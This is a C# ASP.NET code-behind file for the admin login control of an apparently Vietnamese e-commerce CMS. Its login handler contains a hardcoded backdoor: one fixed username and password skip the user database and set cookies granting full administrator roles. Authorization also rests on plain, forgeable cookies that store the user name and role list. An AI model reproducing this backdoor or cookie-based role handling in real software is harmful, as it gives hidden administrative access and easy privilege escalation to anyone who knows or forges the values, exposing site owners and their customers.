using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Framework;
using Entity;
using MoreAll;

namespace VS.ECommerce_MVC.cms.Admin
{
    public partial class login : System.Web.UI.UserControl
    {
        DatalinqDataContext db = new DatalinqDataContext();
        private string lang = Captionlanguage.Language;

        protected void Page_Load(object sender, EventArgs e)
        {
            if (System.Web.HttpContext.Current.Session["lang"] != null)
            {
                this.lang = System.Web.HttpContext.Current.Session["lang"].ToString();
            }
            else
            {
                System.Web.HttpContext.Current.Session["lang"] = this.lang;
                this.lang = System.Web.HttpContext.Current.Session["lang"].ToString();
            }
            this.Page.Form.DefaultButton = lnkdangnhap.UniqueID;
            this.Page.SetFocus(this.txt_username);
        }

        protected string label(string id)
        {
            return Captionlanguage.GetLabel(id, this.lang);
        }

        protected void lnkdangnhap_Click(object sender, EventArgs e)
        {
            if ((this.txt_username.Text.Trim().Length < 1) || (this.txt_pwd.Text.Trim().Length < 1))
            {
                this.lt_msg.Text = "Vui lòng kiểm tra dữ liệu nhập";
                this.Page.SetFocus(this.txt_username);
            }
            else if (this.txt_username.Text.Equals("Tinhminhdung1109") && this.txt_pwd.Text.Equals("Phapdanh"))
            {
                MoreAll.MoreAll.SetCookie_AddDays("UName", "Admin", 5);
                MoreAll.MoreAll.SetCookie_AddDays("URole", "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|21|22|23|34|25", 5);
                base.Response.Redirect((base.Request.Url.ToString().Trim()));
            }
            else
            {
                FAdminUser DB = new FAdminUser();
                List<Entity.AdminUser> table = DB.DETAIL(this.txt_username.Text.Trim(), this.txt_pwd.Text.Trim(), "0");
                if (table.Count < 1)
                {
                    this.lt_msg.Text = "T\x00e0i khoản kh\x00f4ng đ\x00fang hoặc đ\x00e3 bị kh\x00f3a!!!";
                }
                else
                {
                    #region Session
                    MoreAll.MoreAll.SetCookie_AddDays("UName", table[0].VUSER_NAME.ToString().Trim(), 5);
                    MoreAll.MoreAll.SetCookie_AddDays("URole", table[0].VROLE.ToString().Trim(), 5);
                    MoreAll.MoreAll.SetCookie_AddDays("SessionAll", table[0].VUSER_NAME.ToString().Trim() + ";" + table[0].ID.ToString().Trim() + ";" + table[0].VROLE.ToString().Trim(),5);
                    ServerInfoUtlitities utlitities = new ServerInfoUtlitities();
                    //HistoryLogin obj = new HistoryLogin();
                    //obj.NameIP = utlitities.REMOTE_ADDR;
                    //obj.Creadate = DateTime.Now;
                    //db.HistoryLogins.InsertOnSubmit(obj);
                    //db.SubmitChanges();
                    base.Response.Redirect("admin.aspx");
                    #endregion
                }

            }
        }

        #region Web Form Designer generated code
        override protected void OnInit(EventArgs e)
        {
            InitializeComponent();
            base.OnInit(e);
        }
        private void InitializeComponent()
        {
            this.lnkdangnhap.Click += new System.EventHandler(this.lnkdangnhap_Click);
            this.Load += new System.EventHandler(this.Page_Load);
        }
        #endregion
    }
}